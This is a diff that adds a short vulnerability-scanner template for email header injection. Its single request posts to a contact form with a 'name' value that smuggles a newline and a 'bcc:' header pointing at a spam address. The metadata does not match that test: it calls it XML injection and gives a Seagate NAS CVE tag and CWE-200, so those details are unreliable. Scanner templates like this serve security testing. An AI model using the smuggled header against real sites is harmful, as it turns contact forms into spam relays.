@@ -1,0 +1,29 @@
+id: Email-Injection
+
+info:
+  name: Email-Injection
+  author: 邮件注入
+  severity: high
+  description: Xml injection vulnerability.
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-200
+  tags: cve,cve2018,seagate,nasos,disclosure,Email
+
+requests:
+  - raw:
+      - |
+        POST /contact.php HTTP/1.1
+        Host: {{Hostname}}
+        Referer: {{BaseURL}}
+        
+        name=Attacker\nbcc: spam@qq.com&replyTo=attacker@qq.com&message=Attacker message
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'success'
+
+# Enhanced by mp on 2022/07/05
